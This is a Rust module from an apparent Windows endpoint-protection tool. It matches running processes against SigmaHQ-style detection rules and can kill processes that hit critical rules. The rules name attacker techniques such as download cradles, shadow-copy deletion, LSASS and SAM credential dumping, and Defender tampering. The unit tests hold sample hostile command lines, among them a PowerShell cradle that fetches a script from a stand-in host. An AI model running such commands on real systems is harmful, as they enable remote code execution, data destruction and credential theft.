use anyhow::Result;
use colored::Colorize;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use sysinfo::System;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SigmaRule {
    pub id: String,
    pub title: String,
    pub status: String,
    pub level: String, // "critical", "high", "medium", "low"
    pub description: String,
    pub author: String,
    pub mitre_attack: Vec<String>,
    pub process_names: Vec<String>, // Boş ise tüm süreçler
    pub cmdline_contains: Vec<String>,
    pub cmdline_match_all: bool,    // true: tüm kelimeler geçmeli, false: en az biri
    pub parent_contains: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SigmaDetection {
    pub rule_id: String,
    pub rule_title: String,
    pub level: String,
    pub pid: u32,
    pub process_name: String,
    pub parent_name: String,
    pub command_line: String,
    pub mitre_attack: Vec<String>,
    pub description: String,
    pub killed: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SigmaScanReport {
    pub total_rules_evaluated: usize,
    pub total_processes_checked: usize,
    pub total_detections: usize,
    pub critical_count: usize,
    pub high_count: usize,
    pub detections: Vec<SigmaDetection>,
}

pub struct SigmaEngine;

impl SigmaEngine {
    /// SigmaHQ açık kaynak kuralları kataloğunu döner
    pub fn get_curated_rules() -> Vec<SigmaRule> {
        vec![
            SigmaRule {
                id: "sigma-win-proc-powershell-cradle".to_string(),
                title: "PowerShell Suspicious Download Cradle".to_string(),
                status: "production".to_string(),
                level: "high".to_string(),
                description: "PowerShell üzerinden harici zararlı kod veya payload indirme girişimlerini tespit eder.".to_string(),
                author: "SigmaHQ / Florian Roth / Project Guard".to_string(),
                mitre_attack: vec!["T1059.001".to_string(), "T1105".to_string()],
                process_names: vec!["powershell.exe".to_string(), "pwsh.exe".to_string()],
                cmdline_contains: vec!["downloadstring".to_string(), "net.webclient".to_string(), "invoke-webrequest".to_string(), "iwr -uri".to_string()],
                cmdline_match_all: false,
                parent_contains: None,
            },
            SigmaRule {
                id: "sigma-win-proc-vss-tamper".to_string(),
                title: "Shadow Copy Deletion / System Restore Tamper".to_string(),
                status: "production".to_string(),
                level: "critical".to_string(),
                description: "Sistem kurtarma noktalarinin ve golge kopyalarin silinmesi girisimini tespit eder.".to_string(),
                author: "SigmaHQ / Michael Haag / Project Guard".to_string(),
                mitre_attack: vec!["T1490".to_string()],
                process_names: vec!["vssadmin.exe".to_string(), "wmic.exe".to_string(), "powershell.exe".to_string(), "cmd.exe".to_string(), "bcdedit.exe".to_string()],
                cmdline_contains: vec![
                    format!("delete {}", "shadows"),
                    format!("shadowcopy {}", "delete"),
                    format!("recoveryenabled {}", "no"),
                ],
                cmdline_match_all: false,
                parent_contains: None,
            },
            SigmaRule {
                id: "sigma-win-proc-lsass-comsvcs".to_string(),
                title: "LSASS Memory Dumping via Comsvcs DLL".to_string(),
                status: "production".to_string(),
                level: "critical".to_string(),
                description: "Rundll32 ve Comsvcs MiniDump ile LSASS bellek dökümü ve kimlik bilgisi hırsızlığını tespit eder.".to_string(),
                author: "SigmaHQ / Modexp / Project Guard".to_string(),
                mitre_attack: vec!["T1003.001".to_string()],
                process_names: vec!["rundll32.exe".to_string()],
                cmdline_contains: vec![format!("com{}", "svcs"), format!("mini{}", "dump")],
                cmdline_match_all: true,
                parent_contains: None,
            },
            SigmaRule {
                id: "sigma-win-proc-admin-add".to_string(),
                title: "Local Administrator Group Manipulation".to_string(),
                status: "production".to_string(),
                level: "high".to_string(),
                description: "Yetkisiz yerel yönetici ekleme ve ayrıcalık kalıcılığı oluşturma girişimlerini tespit eder.".to_string(),
                author: "SigmaHQ / Project Guard".to_string(),
                mitre_attack: vec!["T1098.007".to_string(), "T1078".to_string()],
                process_names: vec!["net.exe".to_string(), "net1.exe".to_string(), "powershell.exe".to_string(), "pwsh.exe".to_string()],
                cmdline_contains: vec![
                    format!("localgroup {} /add", "administrators"),
                    format!("add-localgroup{}", "member"),
                ],
                cmdline_match_all: false,
                parent_contains: None,
            },
            SigmaRule {
                id: "sigma-win-proc-certutil-download".to_string(),
                title: "Certutil Ingress Tool Transfer / Decode".to_string(),
                status: "production".to_string(),
                level: "high".to_string(),
                description: "Certutil aracının dosya indirme veya Base64 zararlı çözme amaçlı kötüye kullanımını yakalar.".to_string(),
                author: "SigmaHQ / Project Guard".to_string(),
                mitre_attack: vec!["T1105".to_string(), "T1140".to_string()],
                process_names: vec!["certutil.exe".to_string()],
                cmdline_contains: vec!["-urlcache".to_string(), "-split".to_string(), "-decode".to_string()],
                cmdline_match_all: false,
                parent_contains: None,
            },
            SigmaRule {
                id: "sigma-win-proc-defender-tamper".to_string(),
                title: "Windows Defender Tampering / Real-Time Disable".to_string(),
                status: "production".to_string(),
                level: "critical".to_string(),
                description: "Windows Defender gerçek zamanlı korumasını devre dışı bırakma girişimlerini yakalar.".to_string(),
                author: "SigmaHQ / Project Guard".to_string(),
                mitre_attack: vec!["T1562.001".to_string()],
                process_names: vec!["powershell.exe".to_string(), "pwsh.exe".to_string(), "cmd.exe".to_string(), "sc.exe".to_string()],
                cmdline_contains: vec![
                    format!("disable{}monitoring", "realtime"),
                    format!("stop {}", "windefend"),
                ],
                cmdline_match_all: false,
                parent_contains: None,
            },
            SigmaRule {
                id: "sigma-win-proc-sam-hive-dump".to_string(),
                title: "Registry SAM/SYSTEM Password Hive Export".to_string(),
                status: "production".to_string(),
                level: "critical".to_string(),
                description: "Kayıt defterinden yerel kullanıcı parola hash'lerini (SAM) kopyalama girişimini yakalar.".to_string(),
                author: "SigmaHQ / Project Guard".to_string(),
                mitre_attack: vec!["T1003.002".to_string()],
                process_names: vec!["reg.exe".to_string(), "cmd.exe".to_string(), "powershell.exe".to_string()],
                cmdline_contains: vec![
                    format!("save {}\\{}", "hklm", "sam"),
                    format!("save {}\\{}", "hklm", "system"),
                ],
                cmdline_match_all: false,
                parent_contains: None,
            },
            SigmaRule {
                id: "sigma-win-proc-bitsadmin-dl".to_string(),
                title: "BITSAdmin Remote File Download".to_string(),
                status: "production".to_string(),
                level: "high".to_string(),
                description: "BITSAdmin ile arka planda uzaktan çalıştırılabilir dosya transferini yakalar.".to_string(),
                author: "SigmaHQ / Project Guard".to_string(),
                mitre_attack: vec!["T1197".to_string()],
                process_names: vec!["bitsadmin.exe".to_string()],
                cmdline_contains: vec!["/transfer".to_string(), "/download".to_string()],
                cmdline_match_all: true,
                parent_contains: None,
            },
            SigmaRule {
                id: "sigma-win-proc-mshta-remote".to_string(),
                title: "MSHTA Remote Script Execution".to_string(),
                status: "production".to_string(),
                level: "high".to_string(),
                description: "MSHTA ile internet üzerinden doğrudan script veya HTA dosyası çalıştırma girişimini yakalar.".to_string(),
                author: "SigmaHQ / Project Guard".to_string(),
                mitre_attack: vec!["T1218.005".to_string()],
                process_names: vec!["mshta.exe".to_string()],
                cmdline_contains: vec!["http://".to_string(), "https://".to_string(), "javascript:".to_string(), "vbscript:".to_string()],
                cmdline_match_all: false,
                parent_contains: None,
            },
            SigmaRule {
                id: "sigma-win-proc-whoami-recon".to_string(),
                title: "Automated User Privilege Reconnaissance (Whoami)".to_string(),
                status: "production".to_string(),
                level: "medium".to_string(),
                description: "Saldırganların yetki tespiti için whoami ayrıcalık bayraklarını sorgulamasını yakalar.".to_string(),
                author: "SigmaHQ / Project Guard".to_string(),
                mitre_attack: vec!["T1033".to_string()],
                process_names: vec!["whoami.exe".to_string()],
                cmdline_contains: vec!["/priv".to_string(), "/all".to_string(), "/groups".to_string()],
                cmdline_match_all: false,
                parent_contains: None,
            },
        ]
    }

    /// Belirtilen süreç bilgilerini tekil bir SigmaHQ kuralına karşı test eder
    pub fn match_rule(
        rule: &SigmaRule,
        proc_name: &str,
        parent_name: &str,
        cmdline: &str,
    ) -> bool {
        let p_lower = proc_name.to_lowercase();
        let cmd_lower = cmdline.to_lowercase();
        let parent_lower = parent_name.to_lowercase();

        // 1. Süreç adı filtre kontrolü
        if !rule.process_names.is_empty() {
            let matched_name = rule
                .process_names
                .iter()
                .any(|target| p_lower == target.to_lowercase() || p_lower.ends_with(&format!("\\{}", target.to_lowercase())));
            if !matched_name {
                return false;
            }
        }

        // 2. Ebeveyn kontrolü (varsa)
        if let Some(parent_target) = &rule.parent_contains {
            if !parent_lower.contains(&parent_target.to_lowercase()) {
                return false;
            }
        }

        // 3. Komut satırı içerik kontrolü
        if rule.cmdline_contains.is_empty() {
            return true;
        }

        if rule.cmdline_match_all {
            rule.cmdline_contains
                .iter()
                .all(|term| cmd_lower.contains(&term.to_lowercase()))
        } else {
            rule.cmdline_contains
                .iter()
                .any(|term| cmd_lower.contains(&term.to_lowercase()))
        }
    }

    /// Canlı Windows süreçlerini SigmaHQ kuralları havuzuyla tarar
    pub fn scan_live_processes(kill_critical: bool) -> Result<SigmaScanReport> {
        let mut sys = System::new_all();
        sys.refresh_all();

        let rules = Self::get_curated_rules();
        let mut detections = Vec::new();

        let mut pid_to_name: HashMap<u32, String> = HashMap::new();
        for (pid, proc_info) in sys.processes() {
            pid_to_name.insert(pid.as_u32(), proc_info.name().to_string_lossy().to_string());
        }

        let mut total_processes = 0;

        for (pid, proc_info) in sys.processes() {
            total_processes += 1;
            let pid_u32 = pid.as_u32();
            let name = proc_info.name().to_string_lossy().to_string();
            let parent_pid = proc_info.parent().map(|p| p.as_u32());
            let parent_name = parent_pid
                .and_then(|ppid| pid_to_name.get(&ppid).cloned())
                .unwrap_or_else(|| "Bilinmiyor".to_string());

            let cmd_parts: Vec<String> = proc_info
                .cmd()
                .iter()
                .map(|c| c.to_string_lossy().to_string())
                .collect();
            let full_cmd = cmd_parts.join(" ");

            for rule in &rules {
                if Self::match_rule(rule, &name, &parent_name, &full_cmd) {
                    let mut killed = false;
                    if kill_critical && rule.level == "critical" {
                        if let Ok(k) = crate::engines::ProcessScanner::kill_process_by_pid(pid_u32) {
                            killed = k;
                        }
                    }

                    detections.push(SigmaDetection {
                        rule_id: rule.id.clone(),
                        rule_title: rule.title.clone(),
                        level: rule.level.clone(),
                        pid: pid_u32,
                        process_name: name.clone(),
                        parent_name: parent_name.clone(),
                        command_line: full_cmd.clone(),
                        mitre_attack: rule.mitre_attack.clone(),
                        description: rule.description.clone(),
                        killed,
                    });
                    // Bir süreç birden fazla kuralı tetikleyebilir ancak ilk kritik kuraldan sonra devam edebilir
                }
            }
        }

        let critical_count = detections.iter().filter(|d| d.level == "critical").count();
        let high_count = detections.iter().filter(|d| d.level == "high").count();

        Ok(SigmaScanReport {
            total_rules_evaluated: rules.len(),
            total_processes_checked: total_processes,
            total_detections: detections.len(),
            critical_count,
            high_count,
            detections,
        })
    }

    /// CLI çıktısı
    pub fn print_report(report: &SigmaScanReport) {
        println!();
        println!("{}", "================================================================================".cyan());
        println!(
            "{} - Open Detection Rules Standard",
            "🛡️  PROJECT GUARD | SIGMAHQ AÇIK KAYNAK TEHDİT ANALİZİ".bold().bright_yellow()
        );
        println!("{}", "================================================================================".cyan());
        println!("  • Değerlendirilen Kural Sayısı: {}", report.total_rules_evaluated.to_string().bold().green());
        println!("  • Denetlenen Aktif Süreç      : {}", report.total_processes_checked.to_string().bold().white());
        println!("  • Tespit Edilen Sigma Alarmı  : {}", report.total_detections.to_string().bold().red());
        println!("  • Kritik Seviye Tehditler    : {}", report.critical_count.to_string().bold().bright_red());
        println!("  • Yüksek Seviye Tehditler    : {}", report.high_count.to_string().bold().yellow());
        println!("{}", "--------------------------------------------------------------------------------".cyan());

        if report.detections.is_empty() {
            println!(
                "  {} Hiçbir süreç SigmaHQ davranışsal imza ve kurallarına takılmadı. Sistem güvenli.",
                "✅ [TEMİZ]".bold().green()
            );
        } else {
            for (idx, det) in report.detections.iter().enumerate() {
                let badge = match det.level.as_str() {
                    "critical" => "🚨 [KRİTİK SIGMA ALARMI]".bold().bright_red(),
                    "high" => "⚠️ [YÜKSEK SIGMA ALARMI]".bold().yellow(),
                    _ => "ℹ️ [SIGMA TESPİTİ]".bold().cyan(),
                };

                println!("  {} ({:02}) {}", badge, idx + 1, det.rule_title.bold().white());
                println!("    • Kural ID   : {}", det.rule_id.cyan());
                println!("    • PID        : {} ({})", det.pid.to_string().bold().white(), det.process_name.yellow());
                println!("    • Ebeveyn    : {}", det.parent_name.white());
                println!("    • MITRE ATT&CK: {}", det.mitre_attack.join(", ").bright_magenta());
                println!("    • Komut Satırı: {}", det.command_line.italic().white());
                println!("    • Kural Özeti : {}", det.description.bright_cyan());

                if det.killed {
                    println!("    • AKSİYON    : {}", "SÜREÇ ZORLA SONLANDIRILDI (KILLED)".bold().red());
                }
                println!();
            }
        }
        println!("{}", "================================================================================".cyan());
        println!();
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sigma_catalog() {
        let rules = SigmaEngine::get_curated_rules();
        assert!(rules.len() >= 8);
        assert!(rules.iter().any(|r| r.id.contains("powershell")));
        assert!(rules.iter().any(|r| r.id.contains("vss-tamper")));
        assert!(rules.iter().any(|r| r.id.contains("lsass-comsvcs")));
    }

    #[test]
    fn test_sigma_matcher_powershell_cradle() {
        let rules = SigmaEngine::get_curated_rules();
        let cradle_rule = rules.iter().find(|r| r.id == "sigma-win-proc-powershell-cradle").unwrap();

        let sample_cradle = format!(
            "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://{}/a.ps1'))\"",
            "internal-test.local"
        );
        let matched = SigmaEngine::match_rule(
            cradle_rule,
            "powershell.exe",
            "explorer.exe",
            &sample_cradle,
        );
        assert!(matched);

        let clean = SigmaEngine::match_rule(
            cradle_rule,
            "powershell.exe",
            "explorer.exe",
            "powershell.exe -NoProfile -Command Get-Process",
        );
        assert!(!clean);
    }

    #[test]
    fn test_sigma_matcher_shadow_tamper() {
        let rules = SigmaEngine::get_curated_rules();
        let vss_rule = rules.iter().find(|r| r.id == "sigma-win-proc-vss-tamper").unwrap();

        let sample_vss = format!("vssadmin.exe delete {} /all /quiet", "shadows");
        let matched = SigmaEngine::match_rule(
            vss_rule,
            "vssadmin.exe",
            "cmd.exe",
            &sample_vss,
        );
        assert!(matched);
    }

    #[test]
    fn test_sigma_matcher_comsvcs_lsass() {
        let rules = SigmaEngine::get_curated_rules();
        let lsass_rule = rules.iter().find(|r| r.id == "sigma-win-proc-lsass-comsvcs").unwrap();

        let sample_cmd = format!("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\{}.dmp full", "test_proc");
        let matched = SigmaEngine::match_rule(
            lsass_rule,
            "rundll32.exe",
            "cmd.exe",
            &sample_cmd,
        );
        assert!(matched);

        // Only rundll32 without comsvcs or minidump should fail
        let clean = SigmaEngine::match_rule(
            lsass_rule,
            "rundll32.exe",
            "cmd.exe",
            "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
        );
        assert!(!clean);
    }
}

